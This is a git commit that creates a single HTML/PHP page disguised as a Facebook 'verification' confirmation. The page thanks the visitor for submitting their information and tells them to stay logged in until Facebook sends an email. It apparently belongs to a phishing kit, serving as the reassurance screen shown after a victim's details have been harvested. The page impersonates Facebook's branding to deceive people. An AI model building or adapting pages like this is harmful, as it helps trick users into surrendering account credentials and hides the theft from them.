0db724bdfe4329b7e89da9dda0c4cf29a3ed7c6e
abdulbaseer102 <147842675+abdulbaseer102@users.noreply.github.com>
2023-10-13 20:05:20 +0500

    Create we.php

---
+++ we.php
@@ -0,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="Facebook_f_logo_(2021).svg" type="image/svg+xml">
+    <title>back</title>
+    <style>
+      h3{
+        border:1px solid gray;
+        border-radius:10px;
+        width:50%;
+        margin-left:19%;
+        background-color:#1877F2;
+        color:white;
+        height:40px;
+        padding-top:20px;
+        
+      }
+        #hello {
+            max-width: 10%;
+            height: auto;
+            display: block;
+            margin: 0 auto;
+        }
+
+        .containar {
+            border: 2px solid gray;
+            width: 90%;
+            max-width: 600px;
+            margin: 0 auto;
+            text-align: justify;
+            padding: 20px;
+          margin-left:27%;
+        }
+
+        h1 {
+            text-align: center;
+            color: rgb(14, 1, 1);
+          
+        }
+
+        p {
+            text-align: justify;
+          margin-left:12%;
+        }
+
+        a {
+            text-decoration: none;
+            display: block;
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        button {
+            color: white;
+            background-color: #1877f2;
+            width: 100%;
+            padding: 10px;
+            font-size: 20px;
+            border: none;
+            border-radius: 10px;
+        }
+
+        @media screen and (max-width: 768px) {
+            .containar {
+                padding: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+<img id="hello" src="https://upload.wikimedia.org/wikipedia/en/0/04/Facebook_f_logo_%282021%29.svg" alt="facebookimg">
+<div class="containar">
+    <h1>Thank you For Verification</h1>
+    <p>We Have Received Your Information. We are verifying your details please don't <br>logout your account until you receive a confirmation email from Facebook.</p>
+  
+    <a href="https://www.facebook.com">
+      <h3>  <b>Return to Facebook Page</b></h3>
+    </a>
+</div>
+</body>
+</html>
